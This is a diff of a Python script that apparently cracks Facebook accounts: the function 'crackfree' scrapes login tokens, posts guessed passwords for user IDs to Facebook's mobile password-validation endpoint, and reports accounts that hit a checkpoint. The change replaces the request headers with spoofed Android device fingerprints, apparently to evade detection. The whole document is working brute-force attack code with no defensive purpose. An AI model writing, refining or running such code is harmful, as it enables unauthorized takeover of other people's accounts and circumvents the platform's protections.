@@ -2247,7 +2247,26 @@ def crackfree(idf,pwv):
             dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
             koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
             koki+=' m_pixel_ratio=2.625; wd=412x756'
-            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+            heade = {'Host': 'm.facebook.com',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'cache-control': 'max-age=0',
+            'dpr': '2.700000047683716',
+            'referer': 'https://www.google.com/',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"M2102J20SG"',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'cross-site',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent':ua,
+}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
                 print(f'\r\033[0;95m[{time.strftime("%H:%M")}•ALONE-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
